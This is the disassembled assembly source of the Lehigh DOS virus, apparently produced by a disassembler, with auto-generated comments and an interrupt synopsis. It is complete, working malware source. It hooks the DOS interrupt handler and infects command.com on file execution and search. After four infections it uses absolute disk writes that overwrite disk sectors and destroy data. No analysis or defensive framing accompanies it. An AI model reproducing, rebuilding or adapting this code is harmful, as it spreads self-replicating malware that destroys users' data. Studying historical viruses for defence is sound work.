﻿


PAGE  59,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        LEHIGH				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   29-Dec-90					         ÛÛ
;ÛÛ      Version:						         ÛÛ
;ÛÛ      Passes:    9	       Analysis Options on: QRS		         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

data_1e		equ	221h			; (0000:0221=0)

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

lehigh		proc	far

start:
		jmp	loc_15			; (6866)
		db	138 dup (0)
data_3		dd	00000h			;  xref 77C7:685D
		db	124 dup (0)
data_4		db	0			;  xref 77C7:66FD, 67D1, 6818
		db	14 dup (0)
data_5		dw	0			;  xref 77C7:6730
		db	0, 0, 0
data_6		dw	0			;  xref 77C7:6756
data_7		db	0			;  xref 77C7:67AD, 67B9, 67C2, 67CC
data_8		db	0			;  xref 77C7:676B, 676F, 677F, 679F
						;            67A3
		db	0
data_9		db	0			;  xref 77C7:67B2, 67D4, 680D
data_10		dw	0			;  xref 77C7:671B, 6759
		db	256 dup (0)
		db	25516 dup (90h)
		db	 50h, 53h, 80h,0FCh, 4Bh, 74h
		db	 08h, 80h,0FCh, 4Eh, 74h, 03h
		db	0E9h, 77h, 01h, 8Bh,0DAh, 80h
		db	 7Fh, 01h, 3Ah, 75h, 05h, 8Ah
		db	 07h,0EBh, 07h, 90h
loc_1:
		mov	ah,19h
		int	44h
		add	al,61h			; 'a'
loc_2:
		push	ds
		push	cx
		push	dx
		push	di
		push	cs
		pop	ds
		mov	bx,offset data_4	; (77C7:020D=0)
		mov	[bx],al
		mov	dx,bx
		mov	ax,3D02h
		int	44h
		jnc	loc_3			; Jump if carry=0
		jmp	loc_14			; (6857)
loc_3:						;  xref 77C7:6709
		mov	bx,ax
		mov	ax,4202h
		xor	cx,cx			; Zero register
		mov	dx,cx
		int	44h
		mov	dx,ax
		mov	data_10,ax		; (77C7:0227=0)
		sub	dx,2
		mov	ax,4200h
		int	44h
		mov	dx,21Ch
		mov	cx,2
		mov	ah,3Fh			; '?'
		int	44h
		cmp	data_5,65A9h		; (77C7:021C=0)
		jne	loc_4			; Jump if not equal
		jmp	loc_6			; (67BE)
loc_4:						;  xref 77C7:6736
		xor	dx,dx			; Zero register
		mov	cx,dx
		mov	ax,4200h
		int	44h
		mov	cx,3
		mov	dx,21Ch
		mov	di,dx
		mov	ah,3Fh			; '?'
		int	44h
		mov	ax,[di+1]
		add	ax,103h
		mov	data_6,ax		; (77C7:0221=0)
		mov	dx,data_10		; (77C7:0227=0)
		sub	dx,22Ah
		dec	dx
		mov	[di],dx
		xor	cx,cx			; Zero register
		mov	ax,4200h
		int	44h
		mov	al,data_8		; (77C7:0224=0)
		push	ax
		mov	data_8,0		; (77C7:0224=0)
		mov	cx,22Ah
		inc	cx
		xor	dx,dx			; Zero register
		mov	ah,40h			; '@'
		int	44h
		pop	ax
		mov	data_8,al		; (77C7:0224=0)
		xor	cx,cx			; Zero register
		mov	dx,1
		mov	ax,4200h
		int	44h
		mov	ax,[di]
		add	ax,191h
		sub	ax,3
		mov	[di],ax
		mov	dx,di
		mov	cx,2
		mov	ah,40h			; '@'
		int	44h
		inc	data_8			; (77C7:0224=0)
		cmp	data_8,4		; (77C7:0224=0)
		jb	loc_5			; Jump if below
		jmp	short loc_9		; (680D)
		db	90h
loc_5:						;  xref 77C7:67A8
		mov	data_7,0		; (77C7:0223=0)
		cmp	data_9,2		; (77C7:0226=0)
		jb	loc_6			; Jump if below
		mov	data_7,1		; (77C7:0223=0)
loc_6:						;  xref 77C7:6738, 67B7
		mov	ah,3Eh			; '>'
		int	44h
		cmp	data_7,1		; (77C7:0223=0)
		je	loc_7			; Jump if equal
		jmp	loc_14			; (6857)
loc_7:						;  xref 77C7:67C7
		mov	data_7,0		; (77C7:0223=0)
		mov	bx,offset data_4	; (77C7:020D=0)
		mov	al,data_9		; (77C7:0226=0)
		add	al,61h			; 'a'
		mov	[bx],al
		mov	dx,bx
		mov	ax,3D02h
		int	44h
		jnc	loc_8			; Jump if carry=0
		jmp	short loc_14		; (6857)
		db	90h
loc_8:						;  xref 77C7:67E2
		mov	bx,ax
		mov	ax,4202h
		xor	cx,cx			; Zero register
		mov	dx,cx
		int	44h
		mov	dx,ax
		sub	dx,7
		mov	ax,4200h
		int	44h
		mov	cx,1
		mov	dx,224h
		mov	ah,40h			; '@'
		int	44h
		mov	ah,3Eh			; '>'
		int	44h
		jmp	short loc_14		; (6857)
		db	90h
loc_9:						;  xref 77C7:67AA
		mov	al,data_9		; (77C7:0226=0)
		cmp	al,2
		jae	loc_13			; Jump if above or =
		mov	ah,19h
		int	44h
		mov	bx,offset data_4	; (77C7:020D=0)
		mov	dl,[bx]
		cmp	dl,41h			; 'A'
		je	loc_10			; Jump if equal
		cmp	dl,61h			; 'a'
		je	loc_10			; Jump if equal
		cmp	dl,62h			; 'b'
		je	loc_11			; Jump if equal
		cmp	dl,42h			; 'B'
		je	loc_11			; Jump if equal
		jmp	short loc_14		; (6857)
		db	90h
loc_10:						;  xref 77C7:6820, 6825
		mov	dl,0
		jmp	short loc_12		; (683B)
		db	90h
loc_11:						;  xref 77C7:682A, 682F
		mov	dl,1
loc_12:						;  xref 77C7:6836
		cmp	al,dl
		jne	loc_13			; Jump if not equal
		jmp	short loc_14		; (6857)
		db	90h
loc_13:						;  xref 77C7:6812, 683D
		mov	si,0FE00h
		mov	ds,si
		mov	cx,20h
		mov	dx,1
		int	26h			; Absolute disk write, drive al
		popf				; Pop flags
		mov	ah,9
		mov	dx,1840h
		int	44h
loc_14:						;  xref 77C7:670B, 67C9, 67E4, 680A
						;            6831, 683F
		pop	di
		pop	dx
		pop	cx
		pop	ds
		pop	bx
		pop	ax
		jmp	cs:data_3		; (77C7:018D=0)
		db	 67h, 01h,0B8h, 0Eh
loc_15:						;  xref 77C7:0100
		call	sub_1			; (6869)

lehigh		endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;
;         Called from:	 77C7:6866
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_1		proc	near
		pop	si
		sub	si,3
		mov	bx,si
		sub	bx,191h
		push	bx
		add	bx,227h
		mov	ah,19h
		int	21h			; DOS Services  ah=function 19h
						;  get default drive al  (0=a:)
		mov	[bx-1],al
		mov	ax,[bx]
		add	ax,100h
		mov	cl,4
		shr	ax,cl			; Shift w/zeros fill
		inc	ax
		mov	bx,ax
		mov	ah,4Ah			; 'J'
		int	21h			; DOS Services  ah=function 4Ah
						;  change mem allocation, bx=siz
		jnc	loc_16			; Jump if carry=0
		jmp	short loc_18		; (68DC)
		db	90h
loc_16:						;  xref 77C7:688F
		mov	cl,4
		mov	dx,22Ah
		shr	dx,cl			; Shift w/zeros fill
		inc	dx
		mov	bx,dx
		mov	ah,48h			; 'H'
		int	21h			; DOS Services  ah=function 48h
						;  allocate memory, bx=bytes/16
		jnc	loc_17			; Jump if carry=0
		jmp	short loc_18		; (68DC)
		db	90h
loc_17:						;  xref 77C7:68A2
		push	es
		push	ax
		mov	ax,3521h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	[si-4],bx
		mov	[si-2],es
		pop	es
		push	si
		sub	si,191h
		xor	di,di			; Zero register
		mov	cx,22Ah
		inc	cx
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		pop	si
		push	ds
		mov	dx,[si-4]
		mov	ax,[si-2]
		mov	ds,ax
		mov	ax,2544h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		push	es
		pop	ds
		xor	dx,dx			; Zero register
		mov	ax,2521h
		int	44h
		pop	ds
		pop	es
loc_18:						;  xref 77C7:6891, 68A4
		pop	bx
		push	word ptr ds:data_1e[bx]	; (0000:0221=0)
		retn
sub_1		endp

		db	'b:\command.com'


		db	 00h,0D5h, 65h, 02h, 00h, 00h
		db	 29h, 03h, 00h, 00h, 00h, 01h
		db	 00h, 68h,0A9h
		db	65h

seg_a		ends



		end	start

±±±±±±±±±±±±±±±±±±±± CROSS REFERENCE - KEY ENTRY POINTS ±±±±±±±±±±±±±±±±±±±

    seg:off    type	   label
   ---- ----   ----   ---------------
   77C7:0100   far    start

 ±±±±±±±±±±±±±±±±±± Interrupt Usage Synopsis ±±±±±±±±±±±±±±±±±±

        Interrupt 21h :	 get default drive al  (0=a:)
        Interrupt 21h :	 set intrpt vector al to ds:dx
        Interrupt 21h :	 get intrpt vector al in es:bx
        Interrupt 21h :	 allocate memory, bx=bytes/16
        Interrupt 21h :	 change mem allocation, bx=siz
           20 Ocurrences of Non-Standard Interrupts used.

 ±±±±±±±±±±±±±±±±±± I/O	Port Usage Synopsis  ±±±±±±±±±±±±±±±±±±

        No I/O ports used.


